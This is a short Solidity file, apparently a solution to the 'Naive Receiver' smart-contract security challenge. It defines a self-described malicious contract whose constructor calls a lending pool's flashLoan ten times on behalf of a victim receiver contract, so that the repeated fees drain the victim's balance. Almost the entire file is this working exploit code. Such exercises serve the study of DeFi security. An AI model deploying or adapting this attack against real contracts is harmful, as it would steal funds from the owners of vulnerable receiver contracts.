// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

// Using the flash loan function from the naive receiver contract
interface IPool {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

// Creating a malicious contract to take the flash loan on behalf of the naive receiver
contract naiveReceiverAttacker {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool, address _attacked){
        for(uint256 i = 0; i < 10; i++){
            IPool(_pool).flashLoan(
                _attacked,
                ETH,
                0,
                "0x"
            );
        }
        
    }

}